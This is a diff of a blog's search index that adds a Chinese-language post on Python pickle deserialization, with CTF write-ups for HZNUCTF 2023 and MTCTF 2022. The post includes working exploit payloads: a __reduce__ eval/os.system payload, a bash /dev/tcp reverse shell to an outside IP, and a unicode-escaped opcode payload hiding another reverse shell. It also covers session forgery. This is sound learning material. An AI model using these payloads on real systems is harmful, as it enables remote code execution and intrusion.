@@ -3,7 +3,8 @@
   <entry>
     <title>测试</title>
     <url>/2024/06/13/%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<p>1122<br>33</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1122<br>33</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240706235737.png"></p>
 ]]></content>
       <categories>
         <category>hhh</category>
@@ -73,5 +74,110 @@
       <tags>
         <tag>其他</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>python反序列化</title>
+    <url>/2024/07/07/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h1><p>与PHP类似，python也有序列化功能以长期储存内存中的数据。</p>
+<p>pickle就是python下的序列化与反序列化包。</p>
+<h1 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h1><p>pickle.dump(obj, file)：将对象序列化并保存到文件中。</p>
+<p>pickle.dumps(obj)：将对象序列化并返回字节流。</p>
+<p>pickle.load(file)：从文件中读取字节流并反序列化为对象。</p>
+<p>pickle.loads(bytes_obj)：将字节流反序列化为对象。</p>
+<p>pickle.dumps()就类似于php中的serialize</p>
+<p>pickle.loads()就类似于php中的unserialize</p>
+<p>而pickle.dump和pickle.load就是利用到了文件</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707000838.png"></p>
+<h1 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h1><p><strong><em>reduce</em>()</strong></p>
+<p><em>reduce</em>()方法很像php魔术方法中的wakeup()，他会在这个对象进行反序列化的时候自动调用。</p>
+<p><em>reduce</em>() 是Python中一种特殊方法，用于自定义对象的序列化和反序列化过程。当对象需要被序列化成字节流（如存储到文件或通过网络传输），或者从字节流中反序列化回来时，Python会调用该方法。</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001019.png"></p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001033.png"></p>
+<h1 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h1><h2 id="HZNUCTF-2023-preliminary-pickle"><a href="#HZNUCTF-2023-preliminary-pickle" class="headerlink" title="[HZNUCTF 2023 preliminary]pickle"></a>[HZNUCTF 2023 preliminary]pickle</h2><p>进入题目后右键查看源代码</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001138.png"></p>
+<p>有三个路由</p>
+<p>第一个</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001147.png"></p>
+<p>将app.py的内容呈现给我们</p>
+<p>第二个：</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001154.png"></p>
+<p>在&#x2F;calc下get一个payload，然后对其进行base64解码，过滤了os</p>
+<p>然后利用pickle.loads反序列化</p>
+<p>第三个：</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001203.png"></p>
+<p>在&#x2F;readFile目录下get一个filename，过滤了flag，然后读取该文件</p>
+<p>很明显是pickle反序列化，在&#x2F;calc下传入序列化的字节流并写入到文件</p>
+<p>在&#x2F;readFilem下读取文件</p>
+<p>exp：</p>
+<p>import pickle</p>
+<p>import base64</p>
+<p>class A():</p>
+<p>​    def <strong>reduce</strong>(self):</p>
+<p>​        return (eval,(“<strong>import</strong>(‘o’+’s’).system(‘env | tee a’)”,))</p>
+<p>a &#x3D; A()</p>
+<p>b &#x3D; pickle.dumps(a)</p>
+<p>print(base64.b64encode(b))</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001459.png"></p>
+<p>用_reduce_方法</p>
+<p>(eval,(“<strong>import</strong>(‘o’+’s’).system(‘env | tee a’)”,))</p>
+<p>用eval来执行命令</p>
+<p>python中，os就是可以调用system的函数：</p>
+<p>os模块负责程序与操作系统的交互，提供了访问操作系统底层的接口；即os模块提供了非常丰富的方法用来处理文件和目录。</p>
+<p>env命令用于显示系统中已存在的环境变量</p>
+<p>但是由于eval函数没有回显，所以用tee将内容复制到a文件中</p>
+<p>在&#x2F;calc下写入</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001550.png"></p>
+<p>在&#x2F;readFile下读取</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001601.png"></p>
+<h2 id="MTCTF-2022-easypickle"><a href="#MTCTF-2022-easypickle" class="headerlink" title="[MTCTF 2022]easypickle"></a>[MTCTF 2022]easypickle</h2><p>源代码：</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001757.png"></p>
+<p>需要session伪造admin</p>
+<p>密钥需要爆破</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001809.png"></p>
+<p>得到密钥：</p>
+<p>f322</p>
+<p>然后就是pickle的部分</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001859.png"></p>
+<p>对我们传进去的ser_data进行关键字替换，base64解码后赋值给a；</p>
+<p>然后进行if判断R,i,r,b是否存在于a中，如果存在就会报错</p>
+<p>最后进行pickle反序列化</p>
+<p>这里虽然需要用到的os传进去后会变成Os，但是他赋值给了a</p>
+<p>而我们最后pickle.loads的是ser_data</p>
+<p>所以这个替换其实没啥用</p>
+<p>但是这个if语句还是有用的，不能有R,i,o,b</p>
+<p>R指令被禁掉了</p>
+<p>所以我们不能像上面那题一样用**<em>reduce</em>()**方法</p>
+<p>因为这个方法的执行是需要R指令来执行的</p>
+<p>所以这题需要手动构造opcode(有个编写opcode的工具，叫pker，目前还不会用)</p>
+<p>第一次做还不太懂，直接偷别人的payload</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707001959.png"></p>
+<p>(：向栈中压入一个MARK标记</p>
+<p>S：push一个string</p>
+<p>d：将栈顶MARK以前的元素弹出构造dict，再push回栈顶</p>
+<p>c：获取一个全局对象或import一个模块，形式如c[module]\n[instance]\n</p>
+<p>V: 读入一个字符串,以\n结尾,然后把这个字符串压进栈中,V操作码是可以识别\u的,所以可以用来读unicode编码</p>
+<p>. : stop 结束</p>
+<p>大概知道是啥意思了，现在把V操作码里的内容换成我们想要执行的命令就行</p>
+<p>因为没有回显，所以用反弹shell</p>
+<p>bash -c ‘sh -i &gt; &amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.15.153&#x2F;2333 0&gt;&amp;1’</p>
+<p>因为i会被检测到，所以才使用V操作码，将命令进行unicode编码</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707002051.png"></p>
+<p>exp：</p>
+<p>import base64</p>
+<p>opcode&#x3D;b’’’(S’key1’\nS’val1’\ndS’vul’\n(cos\nsystem\nV\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0027\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0035\u0069\u0037\u0038\u0031\u0039\u0036\u0033\u0070\u0032\u002e\u0079\u0069\u0063\u0070\u002e\u0066\u0075\u006e\u002f\u0035\u0038\u0032\u0036\u0035\u0020\u0030\u003e\u0026\u0031\u0027\nos.’’’</p>
+<p>print(base64.b64encode(opcode))</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707002130.png"></p>
+<p>得到payload</p>
+<p>伪造session，user为admin，ser_data为刚得到的payload</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707002137.png"></p>
+<p>用nc监听，在题目cookie里发送</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707002145.png"></p>
+<p>反弹成功拿flag即可</p>
+<p><img src="https://jsd.onmicrosoft.cn/gh/plbplbp/tuchuang/img/20240707002154.png"></p>
+<h2 id="其他例题："><a href="#其他例题：" class="headerlink" title="其他例题："></a>其他例题：</h2><p>（有空再写）</p>
+<p><em>[watevrCTF-2019]Pickle Store    buu</em></p>
+<p>[HFCTF 2021 Final]easyflask      buu</p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>第一次写python反序列化的题，有了初步的认识，后面遇到了相关题再慢慢学</p>
+]]></content>
   </entry>
 </search>
